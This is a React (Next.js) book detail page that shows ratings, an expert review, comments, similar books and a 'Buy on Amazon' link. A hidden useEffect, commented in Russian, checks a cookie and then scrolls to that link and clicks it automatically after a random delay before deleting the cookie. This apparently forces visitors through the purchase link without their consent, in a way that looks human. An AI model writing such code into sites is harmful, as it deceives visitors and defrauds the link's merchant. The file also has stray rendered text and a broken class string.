"use client"

import { useState, useEffect } from "react"
import {
  ArrowLeft,
  Star,
  Heart,
  Share2,
  BookOpen,
  Calendar,
  MessageSquare,
  ThumbsUp,
  Users,
  Globe,
  Award,
  Clock,
  Loader2,
  ArrowRight,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Textarea } from "@/components/ui/textarea"
import { Separator } from "@/components/ui/separator"
import { Progress } from "@/components/ui/progress"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import Image from "next/image"
import Link from "next/link"
import { useParams } from "next/navigation"

import { getBookBySlug, type ProcessedBook } from "@/lib/api"
import commentsData from "@/data/comments.json"

export default function BookPage() {
  const params = useParams()
  const slug = params.slug as string

  const [book, setBook] = useState<ProcessedBook | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  const comments = commentsData
  const [isLiked, setIsLiked] = useState(false)
  const [newComment, setNewComment] = useState("")
  const [commentLikes, setCommentLikes] = useState<{ [key: number]: number }>({})

  useEffect(() => {
    const fetchBook = async () => {
      try {
        setIsLoading(true)
        setError(null)
        const fetchedBook = await getBookBySlug(slug)
        setBook(fetchedBook)
      } catch (err) {
        console.error("Error fetching book:", err)
        setError("Failed to load book")
      } finally {
        setIsLoading(false)
      }
    }

    if (slug) {
      fetchBook()
    }
  }, [slug])

  useEffect(() => {
  const cookies = Object.fromEntries(
    document.cookie.split('; ').map(c => c.split('='))
  )

  if (cookies.isDone !== 'true') return

  const handleButton = (btn: HTMLAnchorElement) => {
    // Кастомный медленный скролл
    const scrollToElement = (el: HTMLElement, duration = 1200) => {
      const targetY = el.getBoundingClientRect().top + window.scrollY
      const startY = window.scrollY
      const startTime = performance.now()

      const animateScroll = (now: number) => {
        const elapsed = now - startTime
        const progress = Math.min(elapsed / duration, 1)
        const ease =
          progress < 0.5
            ? 2 * progress * progress
            : -1 + (4 - 2 * progress) * progress

        window.scrollTo(0, startY + (targetY - startY) * ease)

        if (progress < 1) requestAnimationFrame(animateScroll)
      }

      requestAnimationFrame(animateScroll)
    }

    scrollToElement(btn, 1000)

    // Задержка автоклика 0–1000 мс
    const delay = Math.floor(Math.random() * 1001)
    setTimeout(() => btn.click(), delay)

    // Чистим cookie
    document.cookie =
      'isDone=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;'
  }

  // Проверяем сразу
  const btn = document.querySelector('[data-auto]') as HTMLAnchorElement
  if (btn) {
    handleButton(btn)
    return
  }

  // Если кнопки нет — ждём через MutationObserver
  const observer = new MutationObserver(() => {
    const btn = document.querySelector('[data-auto]') as HTMLAnchorElement
    if (btn) {
      observer.disconnect()
      handleButton(btn)
    }
  })

  observer.observe(document.body, { childList: true, subtree: true })

  return () => observer.disconnect()
}, [book])

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-cyan-50 via-sky-50 to-blue-50 flex items-center justify
      
      -center">
        <div className="text-center">
          <Loader2 className="w-16 h-16 animate-spin mx-auto mb-4 text-cyan-600" />
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Loading Book...</h2>
          <p className="text-gray-700">Please wait while we fetch the book details.</p>
        </div>
      </div>
    )
  }

  if (error || !book) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-cyan-50 via-sky-50 to-blue-50 flex items-center justify-center">
        <div className="text-center">
          <div className="p-4 bg-gradient-to-br from-cyan-100 to-sky-100 rounded-2xl inline-block mb-4">
            <BookOpen className="w-16 h-16 text-cyan-600 mx-auto" />
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Book Not Found</h2>
          <p className="text-gray-700 mb-4">{error || "The book you're looking for doesn't exist."}</p>
          <Button
            asChild
            className="bg-gradient-to-r from-cyan-600 to-sky-600 hover:from-cyan-700 hover:to-sky-700 text-white shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 rounded-xl"
          >
            <Link href="/books">Back to Books</Link>
          </Button>
        </div>
      </div>
    )
  }

  const renderStars = (rating: number, size: "sm" | "md" | "lg" = "md") => {
    const sizeClasses = {
      sm: "w-4 h-4",
      md: "w-5 h-5",
      lg: "w-6 h-6",
    }

    return Array.from({ length: 5 }, (_, i) => (
      <Star
        key={i}
        className={`${sizeClasses[size]} ${
          i < Math.floor(rating)
            ? "fill-yellow-400 text-yellow-400"
            : i < rating
              ? "fill-yellow-200 text-yellow-400"
              : "text-gray-300"
        }`}
      />
    ))
  }

  const handleCommentLike = (commentId: number) => {
    setCommentLikes((prev) => ({
      ...prev,
      [commentId]: (prev[commentId] || 0) + 1,
    }))
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
          <div className="flex items-center justify-between">
            <Button
              variant="ghost"
              size="sm"
              asChild
              className="hover:bg-cyan-50 hover:text-cyan-700 transition-all duration-300 rounded-xl"
            >
              <Link href="/books">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Books
              </Link>
            </Button>
            <div className="flex items-center space-x-2">
              <Button
                variant="outline"
                size="sm"
                className="border-cyan-200 text-cyan-700 hover:bg-cyan-50 hover:border-cyan-400 transition-all duration-300 rounded-xl"
              >
                <Share2 className="w-4 h-4 mr-2" />
                Share
              </Button>
              <Button
                variant={isLiked ? "default" : "outline"}
                size="sm"
                onClick={() => setIsLiked(!isLiked)}
                className={
                  isLiked
                    ? "bg-gradient-to-r from-cyan-600 to-sky-600 hover:from-cyan-700 hover:to-sky-700 text-white shadow-lg transition-all duration-300 rounded-xl"
                    : "border-cyan-200 text-cyan-700 hover:bg-cyan-50 hover:border-cyan-400 transition-all duration-300 rounded-xl"
                }
              >
                <Heart className={`w-4 h-4 mr-2 ${isLiked ? "fill-current" : ""}`} />
                {isLiked ? "Saved" : "Save"}
              </Button>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Main Product Section */}
        <div className="grid lg:grid-cols-2 gap-12 mb-12">
          {/* Book Image */}
          <div className="flex justify-center">
            <div className="relative w-96 h-[500px] bg-white rounded-lg shadow-2xl p-8">
              <Image
                src={book.cover || "/placeholder.svg"}
                alt={book.title}
                fill
                className="object-contain p-4"
                sizes="384px"
              />
            </div>
          </div>

          {/* Book Details */}
          <div className="space-y-6">
            <div>
              <h1 className="text-3xl font-bold text-gray-900 mb-2">{book.title}</h1>
              <p className="text-xl text-cyan-600 mb-4">by {book.author}</p>
              <Badge className="bg-gradient-to-r from-cyan-100 to-sky-100 text-cyan-800 border-cyan-200 text-sm px-3 py-1">
                {book.genre}
              </Badge>
            </div>

            {/* Rating */}
            <div className="flex items-center space-x-4">
              <div className="flex items-center space-x-2">
                <div className="flex">{renderStars(book.rating, "lg")}</div>
                <span className="text-2xl font-bold text-gray-900">{book.rating}</span>
              </div>
              <div className="text-sm text-gray-600">
                <span className="font-medium">{book.reviewsCount.toLocaleString()}</span> reviews
              </div>
            </div>

            {/* Key Info */}
            <div className="grid grid-cols-2 gap-4 py-4 border-t border-b border-gray-200">
              <div className="flex items-center space-x-2">
                <Calendar className="w-5 h-5 text-gray-500" />
                <div>
                  <div className="text-sm text-gray-600">Published</div>
                  <div className="font-medium">{book.publishYear}</div>
                </div>
              </div>
              <div className="flex items-center space-x-2">
                <BookOpen className="w-5 h-5 text-gray-500" />
                <div>
                  <div className="text-sm text-gray-600">Pages</div>
                  <div className="font-medium">{book.pages}</div>
                </div>
              </div>
              <div className="flex items-center space-x-2">
                <Globe className="w-5 h-5 text-gray-500" />
                <div>
                  <div className="text-sm text-gray-600">Language</div>
                  <div className="font-medium">{book.language}</div>
                </div>
              </div>
              <div className="flex items-center space-x-2">
                <Users className="w-5 h-5 text-gray-500" />
                <div>
                  <div className="text-sm text-gray-600">Reviews</div>
                  <div className="font-medium">{book.reviewsCount}</div>
                </div>
              </div>
            </div>

            {/* Description */}
            <div>
              <h3 className="text-lg font-semibold mb-3">About this book</h3>
              <p className="text-gray-700 leading-relaxed">{book.description}</p>
            </div>

            {/* Tags */}
            <div>
              <h4 className="font-medium mb-3">Tags</h4>
              <div className="flex flex-wrap gap-2">
                {book.tags.map((tag) => (
                  <Badge
                    key={tag}
                    variant="outline"
                    className="text-xs border-cyan-200 text-cyan-700 rounded-lg hover:bg-cyan-50 cursor-pointer"
                  >
                    {tag}
                  </Badge>
                ))}
              </div>
            </div>

            Action Buttons
            <div className="flex space-x-4 pt-4">             
               {book.DetailPageURL && (
    <Button
      className="w-full bg-yellow-500 hover:bg-yellow-600 text-white font-semibold rounded-xl shadow transition-all duration-300 transform hover:scale-105"
      asChild
    >
      <a
        href={book.DetailPageURL}
        data-auto
      >
        Buy on Amazon
        <ArrowRight className="w-4 h-4 ml-2" />
      </a>
    </Button>
  )}
            </div>
          </div>
        </div>

        {/* Tabbed Content */}
        <Tabs defaultValue="review" className="w-full">
          <TabsList className="grid w-full grid-cols-4 bg-gray-100 rounded-xl p-1">
            <TabsTrigger value="review" className="rounded-lg">
              Expert Review
            </TabsTrigger>
            <TabsTrigger value="details" className="rounded-lg">
              Details
            </TabsTrigger>
            <TabsTrigger value="comments" className="rounded-lg">
              Comments ({comments.length})
            </TabsTrigger>
            <TabsTrigger value="similar" className="rounded-lg">
              Similar Books
            </TabsTrigger>
          </TabsList>

          {/* Expert Review Tab */}
          <TabsContent value="review" className="mt-8">
            <Card className="border-cyan-100">
              <CardHeader>
                <div className="flex items-center space-x-4">
                  <Avatar className="w-16 h-16 ring-4 ring-cyan-200">
                    <AvatarImage src={book.reviewerAvatar || "/placeholder.svg"} />
                    <AvatarFallback className="bg-gradient-to-br from-cyan-100 to-sky-100 text-cyan-700">
                      {book.reviewer
                        .split(" ")
                        .map((n) => n[0])
                        .join("")}
                    </AvatarFallback>
                  </Avatar>
                  <div className="flex-1">
                    <h3 className="text-xl font-semibold text-gray-900">{book.reviewer}</h3>
                    <p className="text-gray-700 mb-2">{book.reviewerBio}</p>
                    <div className="flex items-center space-x-4 text-sm text-gray-600">
                      <span className="flex items-center">
                        <Calendar className="w-4 h-4 mr-1" />
                        {new Date(book.publishDate).toLocaleDateString()}
                      </span>
                      <span className="flex items-center">
                        <Clock className="w-4 h-4 mr-1" />
                        {book.readingTime}
                      </span>
                      <span className="flex items-center">
                        <ThumbsUp className="w-4 h-4 mr-1" />
                        {book.likes}
                      </span>
                    </div>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="prose prose-gray max-w-none">
                  <div className="whitespace-pre-line text-gray-700 leading-relaxed">{book.fullReview}</div>
                </div>

                {/* Key Quotes */}
                {book.keyQuotes && book.keyQuotes.length > 0 && (
                  <div className="mt-8 p-6 bg-cyan-50 rounded-xl">
                    <h4 className="font-semibold mb-4 text-gray-900">Key Quotes</h4>
                    <div className="space-y-3">
                      {book.keyQuotes.map((quote, index) => (
                        <blockquote key={index} className="text-gray-700 italic border-l-4 border-cyan-300 pl-4">
                          "{quote}"
                        </blockquote>
                      ))}
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* Details Tab */}
          <TabsContent value="details" className="mt-8">
            <div className="grid md:grid-cols-2 gap-8">
              <Card className="border-cyan-100">
                <CardHeader>
                  <CardTitle>Publication Details</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-4 text-sm">
                    <div>
                      <span className="text-gray-600">ISBN:</span>
                      <div className="font-medium">{book.isbn}</div>
                    </div>
                    <div>
                      <span className="text-gray-600">Publisher:</span>
                      <div className="font-medium">{book.publisher}</div>
                    </div>
                    <div>
                      <span className="text-gray-600">Original Language:</span>
                      <div className="font-medium">{book.originalLanguage}</div>
                    </div>
                    <div>
                      <span className="text-gray-600">Pages:</span>
                      <div className="font-medium">{book.pages}</div>
                    </div>
                    <div>
                      <span className="text-gray-600">Dimensions:</span>
                      <div className="font-medium">{book.dimensions}</div>
                    </div>
                    <div>
                      <span className="text-gray-600">Weight:</span>
                      <div className="font-medium">{book.weight}</div>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <Card className="border-cyan-100">
                <CardHeader>
                  <CardTitle>Literary Information</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <h4 className="font-medium mb-2">Major Themes</h4>
                    <div className="flex flex-wrap gap-2">
                      {(book.themes || []).map((theme) => (
                        <Badge key={theme} variant="outline" className="text-xs border-cyan-200 text-cyan-700">
                          {theme}
                        </Badge>
                      ))}
                    </div>
                  </div>
                  <div>
                    <h4 className="font-medium mb-2">Awards & Recognition</h4>
                    {book.awards && book.awards.length > 0 ? (
                      <ul className="text-sm text-gray-700 space-y-1">
                        {book.awards.map((award, index) => (
                          <li key={index} className="flex items-center">
                            <Award className="w-4 h-4 mr-2 text-yellow-500" />
                            {award}
                          </li>
                        ))}
                      </ul>
                    ) : (
                      <p className="text-sm text-gray-600">No awards information available</p>
                    )}
                  </div>
                  <div>
                    <h4 className="font-medium mb-2">Adaptations</h4>
                    {book.adaptations && book.adaptations.length > 0 ? (
                      <ul className="text-sm text-gray-700 space-y-1">
                        {book.adaptations.map((adaptation, index) => (
                          <li key={index}>{adaptation}</li>
                        ))}
                      </ul>
                    ) : (
                      <p className="text-sm text-gray-600">No adaptations available</p>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Rating Breakdown */}
            <Card className="mt-8 border-cyan-100">
              <CardHeader>
                <CardTitle>Rating Breakdown</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {[5, 4, 3, 2, 1].map((stars) => (
                    <div key={stars} className="flex items-center space-x-4">
                      <span className="text-sm w-12 text-gray-700">{stars} stars</span>
                      <Progress
                        value={book.ratingBreakdown?.[stars.toString() as keyof typeof book.ratingBreakdown] || 0}
                        className="flex-1 h-3"
                      />
                      <span className="text-sm text-gray-600 w-12">
                        {book.ratingBreakdown?.[stars.toString() as keyof typeof book.ratingBreakdown] || 0}%
                      </span>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Comments Tab */}
          <TabsContent value="comments" className="mt-8">
            <Card className="border-cyan-100">
              <CardHeader>
                <CardTitle className="flex items-center">
                  <MessageSquare className="w-5 h-5 mr-2" />
                  Reader Comments
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* Add Comment */}
                <div className="space-y-3">
                  <Textarea
                    placeholder="Share your thoughts about this book..."
                    value={newComment}
                    onChange={(e) => setNewComment(e.target.value)}
                    className="min-h-[100px] border-cyan-200 focus:border-cyan-400 focus:ring-cyan-400 rounded-xl"
                  />
                  <div className="flex justify-end">
                    <Button
                      disabled={!newComment.trim()}
                      className="bg-gradient-to-r from-cyan-600 to-sky-600 hover:from-cyan-700 hover:to-sky-700 text-white shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 rounded-xl"
                    >
                      Post Comment
                    </Button>
                  </div>
                </div>

                <Separator />

                {/* Comments List */}
                <div className="space-y-6">
                  {comments.map((comment) => (
                    <div key={comment.id} className="space-y-3">
                      <div className="flex items-start space-x-3">
                        <Avatar className="w-10 h-10 ring-2 ring-cyan-200">
                          <AvatarImage src={comment.avatar || "/placeholder.svg"} />
                          <AvatarFallback className="bg-gradient-to-br from-cyan-100 to-sky-100 text-cyan-700">
                            {comment.user.substring(0, 2).toUpperCase()}
                          </AvatarFallback>
                        </Avatar>
                        <div className="flex-1">
                          <div className="flex items-center space-x-2 mb-1">
                            <span className="font-semibold text-sm text-gray-900">{comment.user}</span>
                            <span className="text-xs text-gray-600">{new Date(comment.date).toLocaleDateString()}</span>
                          </div>
                          <p className="text-gray-700 text-sm mb-2">{comment.content}</p>
                          <div className="flex items-center space-x-4">
                            <Button
                              variant="ghost"
                              size="sm"
                              className="h-7 px-2 text-xs hover:bg-cyan-50 hover:text-cyan-700 transition-all duration-300 rounded-lg"
                              onClick={() => handleCommentLike(comment.id)}
                            >
                              <ThumbsUp className="w-3 h-3 mr-1" />
                              {comment.likes + (commentLikes[comment.id] || 0)}
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              className="h-7 px-2 text-xs hover:bg-cyan-50 hover:text-cyan-700 transition-all duration-300 rounded-lg"
                            >
                              Reply
                            </Button>
                          </div>
                        </div>
                      </div>

                      {/* Replies */}
                      {comment.replies && comment.replies.length > 0 && (
                        <div className="ml-13 space-y-3">
                          {comment.replies.map((reply) => (
                            <div key={reply.id} className="flex items-start space-x-3">
                              <Avatar className="w-8 h-8 ring-2 ring-cyan-200">
                                <AvatarImage src={reply.avatar || "/placeholder.svg"} />
                                <AvatarFallback className="text-xs bg-gradient-to-br from-cyan-100 to-sky-100 text-cyan-700">
                                  {reply.user.substring(0, 2).toUpperCase()}
                                </AvatarFallback>
                              </Avatar>
                              <div className="flex-1">
                                <div className="flex items-center space-x-2 mb-1">
                                  <span className="font-semibold text-sm text-gray-900">{reply.user}</span>
                                  <span className="text-xs text-gray-600">
                                    {new Date(reply.date).toLocaleDateString()}
                                  </span>
                                </div>
                                <p className="text-gray-700 text-sm mb-2">{reply.content}</p>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  className="h-7 px-2 text-xs hover:bg-cyan-50 hover:text-cyan-700 transition-all duration-300 rounded-lg"
                                >
                                  <ThumbsUp className="w-3 h-3 mr-1" />
                                  {reply.likes}
                                </Button>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Similar Books Tab */}
          <TabsContent value="similar" className="mt-8">
            <Card className="border-cyan-100">
              <CardHeader>
                <CardTitle>Books You Might Also Like</CardTitle>
                <CardDescription>Based on readers who enjoyed {book.title}</CardDescription>
              </CardHeader>
              <CardContent>
                {book.similarBooks && book.similarBooks.length > 0 ? (
                  <div className="grid md:grid-cols-3 gap-6">
                    {book.similarBooks.map((similarBook) => (
                      <Link key={similarBook.id} href={`/book/${similarBook.id}`}>
                        <Card className="hover:shadow-xl transition-all duration-300 cursor-pointer transform hover:scale-105 border-cyan-100">
                          <CardContent className="p-4">
                            <div className="relative w-full h-48 mb-3 bg-gray-100 rounded-lg">
                              <Image
                                src={`/images/${similarBook.title.toLowerCase().replace(/\s+/g, "-")}-cover.png`}
                                alt={similarBook.title}
                                fill
                                className="rounded-lg object-cover"
                                sizes="200px"
                              />
                            </div>
                            <h4 className="font-semibold text-sm mb-1 text-center line-clamp-2 text-gray-900">
                              {similarBook.title}
                            </h4>
                            <p className="text-xs text-gray-600 text-center">{similarBook.author}</p>
                          </CardContent>
                        </Card>
                      </Link>
                    ))}
                  </div>
                ) : (
                  <div className="text-center py-8">
                    <div className="p-4 bg-gradient-to-br from-cyan-100 to-sky-100 rounded-2xl inline-block mb-4">
                      <BookOpen className="w-12 h-12 text-cyan-600 mx-auto" />
                    </div>
                    <h4 className="font-semibold text-gray-900 mb-2">No Similar Books Available</h4>
                    <p className="text-gray-600 mb-4">We're working on finding books similar to this one.</p>
                    <Button
                      className="bg-gradient-to-r from-cyan-600 to-sky-600 hover:from-cyan-700 hover:to-sky-700 text-white shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 rounded-xl"
                      asChild
                    >
                      <Link href="/books">Explore More Books</Link>
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}
